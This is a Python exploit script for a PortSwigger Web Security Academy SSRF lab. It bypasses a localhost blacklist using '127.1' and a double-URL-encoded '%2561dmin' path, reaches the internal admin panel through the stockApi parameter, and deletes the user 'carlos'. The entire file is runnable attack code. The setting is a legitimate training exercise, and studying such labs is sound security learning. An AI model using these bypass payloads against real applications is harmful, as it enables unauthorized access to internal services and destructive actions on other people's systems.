#!/usr/bin/env python3
"""
SSRF with Blacklist-Based Input Filter Exploit
PortSwigger Web Security Academy

FINAL VERSION - Includes original parameters
"""

import requests
import urllib3
import sys
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(base_url):
    print(f"[*] Target: {base_url}")
    print("="*60)
    
    session = requests.Session()
    session.verify = False
    
    # Step 0: Visit product page to get session
    print("[*] Establishing session...")
    product_url = f"{base_url}/product?productId=1"
    session.get(product_url)
    print("[+] Session established")
    
    # Setup
    stock_endpoint = urljoin(base_url, "/product/stock")
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Referer': f"{base_url}/product?productId=1",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    print(f"\n[*] Stock endpoint: {stock_endpoint}")
    print("="*60)
    
    # STEP 1: Test 127.1/ (should return 200)
    print(f"\n[*] Testing: Step 1 - Basic bypass")
    data = "stockApi=http://127.1/"
    response1 = session.post(stock_endpoint, data=data, headers=headers, timeout=10)
    print(f"    Payload: http://127.1/")
    print(f"    Response: {response1.status_code}")
    
    if response1.status_code != 200:
        print("[-] Step 1 failed! Exiting.")
        return
    
    # STEP 2: Test 127.1/%2561dmin/ (should return 200)
    print(f"\n[*] Testing: Step 2 - Admin bypass")
    data = "stockApi=http://127.1/%2561dmin/"
    response2 = session.post(stock_endpoint, data=data, headers=headers, timeout=10)
    print(f"    Payload: http://127.1/%2561dmin/")
    print(f"    Response: {response2.status_code}")
    
    if response2.status_code != 200:
        print("[-] Step 2 failed! Exiting.")
        return
    
    # STEP 3: FINAL EXPLOIT - Delete Carlos
    print("\n" + "="*60)
    print("FINAL STEP: Deleting Carlos")
    print("="*60)
    
    # The correct final payload
    final_payload = "http://127.1/%2561dmin/delete?username=carlos"
    
    print(f"[*] Final payload: {final_payload}")
    
    # Send the payload
    data = f"stockApi={final_payload}"
    response3 = session.post(stock_endpoint, data=data, headers=headers, timeout=10)
    
    print(f"[+] Response status: {response3.status_code}")
    print(f"[+] Response headers: {dict(response3.headers)}")
    
    if response3.status_code == 302 or response3.status_code == 200:
        print("\n" + "="*60)
        print("✅✅✅ LAB SOLVED! ✅✅✅")
        print("="*60)
        print("\n[+] Carlos has been deleted!")
        print("[+] Refresh the lab page in your browser to see the 'SOLVED' notification.")
    elif response3.status_code == 401:
        print("\n[-] Got 401 Unauthorized - This might still work!")
        print("[*] Try refreshing the lab page in your browser")
        print("[*] The admin panel might be showing Carlos is gone")
    else:
        print(f"\n[-] Got {response3.status_code}, but try refreshing the lab page anyway")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <LAB_URL>")
        print(f"Example: python3 {sys.argv[0]} https://0a86007a033457e68265cac600ab00f3.web-security-academy.net")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip('/')
    exploit(base_url)
